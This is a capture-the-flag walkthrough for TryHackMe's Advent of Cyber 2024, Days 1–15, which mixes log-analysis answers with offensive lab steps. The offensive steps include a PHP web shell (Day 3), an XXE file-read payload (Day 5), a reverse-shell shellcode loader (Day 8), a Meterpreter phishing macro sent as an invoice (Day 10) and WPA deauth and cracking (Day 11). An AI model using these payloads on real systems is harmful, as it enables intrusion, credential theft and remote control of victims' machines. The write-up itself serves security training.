# 🎄 [Advent of Cyber 2024](https://tryhackme.com/r/room/adventofcyber2024)

* [Day 1: OPSEC - Maybe SOC-mas music, he thought, doesn't come from a store?](#day-1-opsec---maybe-soc-mas-music-he-thought-doesnt-come-from-a-store)
* [Day 2: Log analysis - One man's false positive is another man's potpourri](#day-2-log-analysis---one-mans-false-positive-is-another-mans-potpourri)
* [Day 3: Log analysis - Even if I wanted to go, their vulnerabilities wouldn't allow it](#day-3-log-analysis---even-if-i-wanted-to-go-their-vulnerabilities-wouldnt-allow-it)
* [Day 4: Atomic Red Team - I’m all atomic inside!](#day-4-atomic-red-team---im-all-atomic-inside)
* [Day 5: XXE - SOC-mas XX-what-ee?](#day-5-xxe---soc-mas-xx-what-ee)
* [Day 6: Sandboxes - If I can't find a nice malware to use, I'm not going](#day-6-sandboxes---if-i-cant-find-a-nice-malware-to-use-im-not-going)
* [Day 7: AWS log analysis - Oh, no. I'M SPEAKING IN CLOUDTRAIL!](#day-7-aws-log-analysis---oh-no-im-speaking-in-cloudtrail)
* [Day 8: Shellcodes - Shellcodes of the world, unite!](#day-8-shellcodes---shellcodes-of-the-world-unite)
* [Day 9: GRC - Nine o'clock, make GRC fun, tell no one](#day-9-grc---nine-oclock-make-grc-fun-tell-no-one)
* [Day 10: Phishing - He had a brain full of macros, and had shells in his soul](#day-10-phishing---he-had-a-brain-full-of-macros-and-had-shells-in-his-soul)
* [Day 11: Wi-Fi attacks - If you'd like to WPA, press the star key!](#day-11-wi-fi-attacks---if-youd-like-to-wpa-press-the-star-key)
* [Day 12: Web timing attacks - If I can’t steal their money, I’ll steal their joy!](#day-12-web-timing-attacks---if-i-cant-steal-their-money-ill-steal-their-joy)
* [Day 13: Websockets - It came without buffering! It came without lag!](#day-13-websockets---it-came-without-buffering-it-came-without-lag)
* [Day 14: Certificate mismanagement - Even if we're horribly mismanaged, there'll be no sad faces on SOC-mas!](#day-14-certificate-mismanagement---even-if-were-horribly-mismanaged-therell-be-no-sad-faces-on-soc-mas)
* [Day 15: Active Directory - Be it ever so heinous, there's no place like Domain Controller](#day-15-active-directory---be-it-ever-so-heinous-theres-no-place-like-domain-controller)

## Day 1: OPSEC - Maybe SOC-mas music, he thought, doesn't come from a store?

**Operational Security (OPSEC)** is a set of principals and tactics used to attempt to protect the security of an operator or operation. An example of this may be using code names instead of your real names, or using a proxy to conceal your IP address.

**Looks like the song.mp3 file is not what we expected! Run "exiftool song.mp3" in your terminal to find out the author of the song. Who is the author?**

```shell
exiftool song.mp3 | grep Artist
```

**The malicious PowerShell script sends stolen info to a C2 server. What is the URL of this C2 server?**

```shell
curl -s https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1 | grep "c2Url ="
```

**Who is M.M? Maybe his Github profile page would provide clues?**

Go to https://github.com/MM-WarevilleTHM/M.M

**What is the number of commits on the GitHub repo where the issue was raised?**

Go to https://github.com/MM-WarevilleTHM/IS/commits/main/

**What's with all these GitHub repos? Could they hide something else?**

* https://github.com/MM-WarevilleTHM/M.M/commits/main/ has 5 commits
* Both repos have some forks
* Other than that, nothing `¯\_(ツ)_/¯`

## Day 2: Log analysis - One man's false positive is another man's potpourri

**What is the name of the account causing all the failed login attempts?**
**How many failed logon attempts were observed?**

* Select events between "November 29 0:00" and "December 1 23:30"
* Select fields `user.name`, `event.category` and `event.outcome`
* Search/Filter by `event.category = authentication AND event.outcome = failure`

**What is the IP address of Glitch?**

* On the previous search, add field `source.ip`
* Filter by different values of `source.ip` and select the one that caused the spike

**When did Glitch successfully logon to ADM-01?**

* On the previous search ...
* Search/Filter by `event.category = authentication AND event.outcome = success AND source.ip = <Glitch IP>`

**What is the decoded command executed by Glitch to fix the systems of Wareville?**

* Select fields `event.category` and `process.command_line`
* Search/Filter by `event.category = process`
* Check `powershell.exe` executions with a `-EncodedCommand` value
* Put that value in [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Decode_text('UTF-16LE%20(1200)')&input=U1FCdUFITUFkQUJoQUd3QWJBQXRBRmNBYVFCdUFHUUFid0IzQUhNQVZRQndBR1FBWVFCMEFHVUFJQUF0QUVFQVl3QmpBR1VBY0FCMEFFRUFiQUJzQUNBQUxRQkJBSFVBZEFCdkFGSUFaUUJpQUc4QWJ3QjBBQT09)

## Day 3: Log analysis - Even if I wanted to go, their vulnerabilities wouldn't allow it

**BLUE: Where was the web shell uploaded to?**
**BLUE: What IP address accessed the web shell?**

* Select index `frostypines-resorts`
* Select events between `Oct 3, 2024 @ 11:30:00.000` and `Oct 3, 2024 @ 12:00:00.000`
* Select fields `clientip` and `request`
* Search by `message: "shell.php"`
* Select the IP that executes suspicious commands (query parameter `command`)

**RED: What is the contents of the flag.txt?**

* Execute `sudo echo "10.101.200.8 frostypines.thm" >> /etc/hosts`
* Go to http://frostypines.thm/login.php and login as user `admin@frostypines.thm` and password `admin`
* Go to http://frostypines.thm/admin/add_room.php and create a new room uploading `shell.php` as its image:
  ```html
    <html>
        <body>
            <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
                <input type="text" name="command" autofocus id="command" size="50">
                <input type="submit" value="Execute">
            </form>
            <pre>
            <?php
                if(isset($_GET['command'])) 
                {
                    system($_GET['command'] . ' 2>&1'); 
                }
            ?>
            </pre>
        </body>
    </html>
  ```
* Go to http://frostypines.thm/media/images/rooms/shell.php?command=ls
* Go to http://frostypines.thm/media/images/rooms/shell.php?command=cat%20flag.txt

## Day 4: Atomic Red Team - I’m all atomic inside!

**What was the flag found in the .txt file that is found in the same directory as the PhishingAttachment.xslm artefact?**

```powershell
Invoke-AtomicTest T1566.001 -TestNumbers 1
cat C:\Users\Administrator\AppData\Local\Temp\PhishingAttachment.txt
Invoke-AtomicTest T1566.001-1 -cleanup
```

**What ATT&CK technique ID would be our point of interest?**

* https://attack.mitre.org/techniques/T1059/

**What ATT&CK subtechnique ID focuses on the Windows Command Shell?**

* https://attack.mitre.org/techniques/T1059/003/

**What is the name of the Atomic Test to be simulated?**

Search for a test named "ware":
```powershell
Invoke-AtomicTest T1059.003 -ShowDetailsBrief
```

**What is the name of the file used in the test?**

Search for a txt file:
```powershell
 Invoke-AtomicTest T1059.003 -ShowDetails -TestNumbers 4
```

**What is the flag found from this Atomic Test?**

Execute the test which should print a PDF containing the flag:
```powershell
Invoke-AtomicTest T1059.003 -TestNumbers 4
```

## Day 5: XXE - SOC-mas XX-what-ee?

**What is the flag discovered after navigating through the wishes?**

POST /wishlist.php using Burp Repeater:
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_15.txt"> ]>
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>
```

**What is the flag seen on the possible proof of sabotage?**

Go to http://MACHINE_IP/CHANGELOG

## Day 6: Sandboxes - If I can't find a nice malware to use, I'm not going

**What is the flag displayed in the popup window after the EDR detects the malware?**

* First execute the EDR (Endpoint Detection and Response) `C:\Tools\JingleBells.ps1`
* Then execute `C:\Tools\Malware\MerryChristmas.exe` via File Explorer

**What is the flag found in the malstrings.txt document after running floss.exe?**

```powershell
C:\Tools\FLOSS\floss.exe C:\Tools\Malware\MerryChristmas.exe | Out-file C:\Tools\malstrings.txt
Select-String -Path C:\Tools\malstrings.txt -Pattern THM
```

## Day 7: AWS log analysis - Oh, no. I'M SPEAKING IN CLOUDTRAIL!

**What is the other activity made by the user glitch aside from the ListObject action?** ➕ **What is the source IP related to the S3 bucket activities of the user glitch?**

```shell
jq -r '["User_Name", "Event_Name", "IP"],
( .Records[] 
  | select(
      .eventSource == "s3.amazonaws.com"
      and .requestParameters.bucketName=="wareville-care4wares"
      and .userIdentity.userName=="glitch"
    )
  | [.userIdentity.userName, .eventName, .sourceIPAddress]
) | @tsv' ~/wareville_logs/cloudtrail_log.json
```

**Based on the eventSource field, what AWS service generates the ConsoleLogin event?**

```shell
jq -r '.Records[] | select(.eventName == "ConsoleLogin") | .eventSource' \ cloudtrail_log.json | sort -u
```

**When did the anomalous user trigger the ConsoleLogin event?**

```shell
jq -r '["User_Name", "Event_Time", "IP"],
( .Records[] 
  | select(
      .eventName == "ConsoleLogin"
      and .sourceIPAddress == "53.94.201.69"
      and .userIdentity.userName == "glitch"
    )
  | [.userIdentity.userName, .eventTime, .sourceIPAddress]
) | @tsv' ~/wareville_logs/cloudtrail_log.json
```

**What was the name of the user that was created by the mcskidy user?**

```shell
jq -r '["User_Name", "Event_Time", "Event_Name", "User_Created"],
( .Records[] 
  | select(
      .eventName == "CreateLoginProfile"
      and .userIdentity.userName == "mcskidy"
    )
  | [.userIdentity.userName, .eventTime, .eventName, .requestParameters.userName]
) | @tsv' ~/wareville_logs/cloudtrail_log.json
```

**What type of access was assigned to the anomalous user?**

```shell
jq -r '["User_Name", "Event_Time", "Event_Name", "User_Updated", "Policy"],
( .Records[] 
  | select(
      .eventName == "AttachUserPolicy"
      and .userIdentity.userName == "mcskidy"
    )
  | [.userIdentity.userName, .eventTime, .eventName, .requestParameters.userName, .requestParameters.policyArn]
) | @tsv' ~/wareville_logs/cloudtrail_log.json
```

**Which IP does Mayor Malware typically use to log into AWS?**

```shell
jq -r '.Records[] | select(.userIdentity.userName == "mayor_malware") | .sourceIPAddress' \
~/wareville_logs/cloudtrail_log.json | sort -u
```

**What is McSkidy's actual IP address?**

```shell
jq -r '.Records[]
| select(
  .userIdentity.userName == "mcskidy"
  and .sourceIPAddress != "53.94.201.69"
) | .sourceIPAddress' \
~/wareville_logs/cloudtrail_log.json | sort -u
```

**What is the bank account number owned by Mayor Malware?**

```shell
cat ~/wareville_logs/rds.log | \
grep "INSERT INTO wareville_bank_transactions" | grep "Mayor Malware" | \
grep -oP "VALUES \('\K[^']+" | sort -u
```

## Day 8: Shellcodes - Shellcodes of the world, unite!

**What is the flag value once Glitch gets reverse shell on the digital vault using port 4444?**

On the AttackBox:

1) Create the shell code on the AttackBox
```shell
export ATTACKBOX_IP=x.x.x.x
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKBOX_IP LPORT=4444 -f powershell
```

2) Start the listener:
```shell
nc -nvlp 4444
```

On the Windows machine:

1) Execute:
```powershell
$VrtAlloc = @"
using System;
using System.Runtime.InteropServices;

public class VrtAlloc{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
}
"@

Add-Type $VrtAlloc 

$WaitFor= @"
using System;
using System.Runtime.InteropServices;

public class WaitFor{
[DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
}
"@

Add-Type $WaitFor

$CrtThread= @"
using System;
using System.Runtime.InteropServices;

public class CrtThread{
[DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
  
}
"@
Add-Type $CrtThread
```

2) Replace with your shell code and execute:
```powershell
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x0,0x0,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x1,0x0,0x0,0x49,0x89,0xe5,0x49,0xbc,0x2,0x0,0x11,0x5c,0xa,0xa,0x8b,0xf4,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x7,0xff,0xd5,0x4c,0x89,0xea,0x68,0x1,0x1,0x0,0x0,0x59,0x41,0xba,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x2,0x0,0x0,0x49,0xb8,0x63,0x6d,0x64,0x0,0x0,0x0,0x0,0x0,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,0x57,0x57,0x4d,0x31,0xc0,0x6a,0xd,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,0x24,0x54,0x1,0x1,0x48,0x8d,0x44,0x24,0x18,0xc6,0x0,0x68,0x48,0x89,0xe6,0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0xe,0x41,0xba,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x59,0x41,0x89,0xda,0xff,0xd5
```

3) Execute:
```powershell
[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

4) Wait a minute and on the AttackBox listener or directly from the Windows machine:
```powershell
type C:\Users\glitch\Desktop\flag.txt
```

## Day 9: GRC - Nine o'clock, make GRC fun, tell no one

Just follow the instructions, you can re-edit your assessments until you get all as "Perfect assessment" before completing each step

## Day 10: Phishing - He had a brain full of macros, and had shells in his soul

**What is the flag value inside the flag.txt file that’s located on the Administrator’s desktop?**

1) On one terminal listen for incoming connections:
```shell
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ATTACKBOX_IP>
set LPORT 8888
exploit
```

2) On another terminal create the malicious document:
```shell
msfconsole
set payload windows/meterpreter/reverse_tcp
use exploit/multi/fileformat/office_word_macro
set LHOST <ATTACKBOX_IP>
set LPORT 8888
exploit
exit

mv /root/.msf4/local/msf.docm /root/invoice.docm
```

3) Send the phishing email:
* Go to http://MAILSERVER_IP
* Login as user `info@socnas.thm` and password `MerryPhishMas!`
* New email:
  * To: `marta@socmas.thm`
  * Subject: Invoice
  * Body: Please find attached invoice, best regards! (bla bla bla)
  * Attach /root/invoice.docm

4) After a few seconds a shell should appear in first terminal:
```shell
meterpreter> cat /Users/Administrator/Desktop/flag.txt 
```

## Day 11: Wi-Fi attacks - If you'd like to WPA, press the star key!

Connect to the machine with user `glitch` and password `Password321`:
```shell
export MACHINE_IP=x.x.x.x
ssh glitch@$MACHINE_IP
```

Show wireless devices:
```shell
iw dev

phy#2
	Interface wlan2
		ifindex 5
		wdev 0x200000001
		addr 02:00:00:00:02:00
		type managed
		txpower 20.00 dBm
```

Scan for nearby Wi-Fi networks:
```shell
sudo iw dev wlan2 scan

BSS 02:00:00:00:00:00(on wlan2)
	last seen: 192.392s [boottime]
	TSF: 1733935425101305 usec (20068d, 16:43:45)
	freq: 2437
	beacon interval: 100 TUs
	capability: ESS Privacy ShortSlotTime (0x0411)
	signal: -30.00 dBm
	last seen: 0 ms ago
	Information elements from Probe Response frame:
	SSID: MalwareM_AP
	Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
	DS Parameter set: channel 6
	ERP: Barker_Preamble_Mode
	Extended supported rates: 24.0 36.0 48.0 54.0 
	RSN:	 * Version: 1
		 * Group cipher: CCMP
		 * Pairwise ciphers: CCMP
		 * Authentication suites: PSK
		 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
	Supported operating classes:
		 * current operating class: 81
	Extended capabilities:
		 * Extended Channel Switching
		 * Operating Mode Notification
```

**What is the BSSID of our wireless interface?**

```shell
sudo iw dev wlan2 info | grep addr | awk '{print $2}'
```

Turn device off, switch to monitor mode and turn device back on:
```shell
sudo ip link set dev wlan2 down
sudo iw dev wlan2 set type monitor
sudo ip link set dev wlan2 up
sudo iw dev wlan2 info

Interface wlan2
	ifindex 5
	wdev 0x200000001
	addr 02:00:00:00:02:00
	type monitor
	wiphy 2
	channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
	txpower 20.00 dBm
```

Capture Wi-Fi traffic in the area, specifically targeting the WPA handshake packets, **you can CTRL+C to exit**:
```shell
sudo airodump-ng wlan2

CH 11 ][ Elapsed: 6 s ][ 2024-12-11 17:30

BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

02:00:00:00:00:00  -28        2        0    0   6   54   WPA2 CCMP   PSK  MalwareM_AP

BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
```

Once we have MalwareM_AP access point's BSSID, focus on it and capture the WPA handshake, **keep this command running in one terminal**:
```shell
sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2

CH  6 ][ Elapsed: 24 s ][ 2024-12-11 17:32

BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

02:00:00:00:00:00  -28 100      250        0    0   6   54   WPA2 CCMP   PSK  MalwareM_AP

BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

02:00:00:00:00:00  02:00:00:00:01:00  -29    0 - 1      0        1
```

**What is the BSSID of the wireless interface that is already connected to the access point?**

From the output of the previous command we see a STATION connected with BSSID `02:00:00:00:01:00`

Launch the deauthentication attack **in a second terminal**:
```shell
sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2

17:35:32  Waiting for beacon frame (BSSID: 02:00:00:00:00:00) on channel 6
17:35:32  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]
```

**What is the PSK after performing the WPA cracking attack?**

Attempt to crack the WPA/WP2 passphrase:
```shell
sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap

KEY FOUND! [ the-cracked-psk ]
```

Exit process in first terminal (`sudo airodump-ng ...`) and join the MalwareM_AP access point:
```shell
wpa_passphrase MalwareM_AP 'the-cracked-psk' > config
sudo wpa_supplicant -B -c config -i wlan2
```

Wait a few seconds until we have joined the MalwareM_AP SSID
```shell
iw dev wlan2 info

Interface wlan2
	ifindex 5
	wdev 0x200000001
	addr 02:00:00:00:02:00
	ssid MalwareM_AP
	type managed
	wiphy 2
	channel 6 (2437 MHz), width: 20 MHz (no HT), center1: 2437 MHz
	txpower 20.00 dBm
```

**What is the SSID and BSSID of the access point? Format: SSID, BSSID**

```shell
SSID=$(sudo iw dev wlan2 link | grep SSID | awk '{print $2}')
BSSID=$(sudo iw dev wlan2 link | grep "Connected to" | awk '{print $3}')
echo $SSID, $BSSID
```

## Day 12: Web timing attacks - If I can’t steal their money, I’ll steal their joy!

**What is the flag value after transferring over $2000 from Glitch's account?**

Just follow the instructions!

## Day 13: Websockets - It came without buffering! It came without lag!

**What is the value of Flag1?** 

Just follow the instructions!

**What is the value of Flag2?**

Hint: Exploit the application and SEND a message as Mayor Malware while capturing the traffic

* Refresh the page to start again
* Send a message "Hello bla bla bla"
* Intercept the message `42["send_msg",{"txt":"Hello bla bla bla","sender":"5"}]`
* Forward it as `42["send_msg",{"txt":"Hello bla bla bla","sender":"8"}]`
* Intercept off
* Wait for your message to appear as sent by Mayor Malware
* Wait for Mayor Malware to reply "I didn't send that last message! What is happening?" with the flag

## Day 14: Certificate mismanagement - Even if we're horribly mismanaged, there'll be no sad faces on SOC-mas!

Configure MACHINE_IP as `gift-scheduler.thm`:
```shell
export MACHINE_IP=x.x.x.x
echo "$MACHINE_IP gift-scheduler.thm" >> /etc/hosts
```

Go to https://gift-scheduler.thm/ and login as user `mayor_malware` and password `G4rbag3Day`

Configure **Burp** proxy as instructed and then start traffic:
```shell
export ATTACKBOX_IP=x.x.x.x
echo "$ATTACKBOX_IP wareville-gw" >> /etc/hosts

cd ~/Rooms/AoC2024/Day14
./route-elf-traffic.sh 
```

**What is the name of the CA that has signed the Gift Scheduler certificate?**

You can use the browser "View Certificate" and check the Issuer's Organization, or use this `openssl` command that does the same (the organization is shown as `O = <org>`):
```shell
echo | openssl s_client -connect gift-scheduler.thm:443 -showcerts 2>/dev/null | \
  openssl x509 -noout -issuer | grep -oP '(?<=O = )[^,]*'
```

**What is the password for the snowballelf account?**

Search inside the requests on the Burp > Proxy > HTTP history for the `POST /login.php` with body `username=snowballelf&password=xxxx`

**Use the credentials for any of the elves to authenticate to the Gift Scheduler website. What is the flag shown on the elves’ scheduling page?**

You can use the browser manually or use this `curl` command (replace `xxxx` with the correct password for `snowballelf`):
```shell
cookies_file=$(mktemp)
curl -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary 'username=snowballelf&password=xxxx' \
  -s -k -L -c $cookies_file -b $cookies_file \
  https://gift-scheduler.thm/login.php | grep FLAG
```

Where:
* `-k`: Skip SSL certificate verification (required when the certificate is self-signed or from an untrusted CA)
* `-L`: Follow redirects (required since a successful login returns a 302 Found response that redirects to the main page)
* `-c <file>`: Save cookies to the specified file (required because the login process sets the `PHPSESSID` cookie, which must be preserved for subsequent requests)
* `-b <file>`: Send cookies stored in the specified file (required to send the `PHPSESSID` cookie for authenticated requests after logging in)
* `cookies_file=$(mktemp)`: Use a temporary file to store cookies

**What is the password for Marta May Ware’s account?**

Search inside the requests on the Burp > Proxy > HTTP history for the `POST /login.php` with body `username=marta_mayware&password=xxxx`

**What is the flag shown on the admin page?**

You can use the browser manually or use this `curl` command (replace `xxxx` with the correct password for `marta_mayware`):
```shell
cookies_file=$(mktemp)
curl -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary 'username=marta_mayware&password=xxxx' \
  -s -k -L -c $cookies_file -b $cookies_file \
  https://gift-scheduler.thm/login.php | grep FLAG
```

## Day 15: Active Directory - Be it ever so heinous, there's no place like Domain Controller

**On what day was Glitch_Malware last logged in?**
**What event ID shows the login of the Glitch_Malware user?**

You can search in **Event Viewer** or execute this **PowerShell** command:
```powershell
Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4624)] and EventData[Data[@Name='TargetUserName']='Glitch_Malware']]" |
  Select-Object TimeCreated, Id, Message
```

**Read the PowerShell history of the Administrator account. What was the command that was used to enumerate Active Directory users?**

```powershell
cat $Env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt | Select-String -SimpleMatch "AD" | Select-Object -First 1
```

**Look in the PowerShell log file located in `Application and Services Logs -> Windows PowerShell`. What was Glitch_Malware's set password?**

You can search in **Event Viewer** or execute this **PowerShell** command:
```powershell
Get-WinEvent -LogName "Windows PowerShell" |
Where-Object { $_.ToXml() -like "*Glitch_Malware*" -and $_.ToXml() -like "*Password*" } |
Select-Object -First 1 |
ForEach-Object { $_.ToXml() }
```

**Review the Group Policy Objects present on the machine. What is the name of the installed GPO?**

```powershell
Get-GPO -All | Where-Object { $_.DisplayName -like "Malicious*" }
```
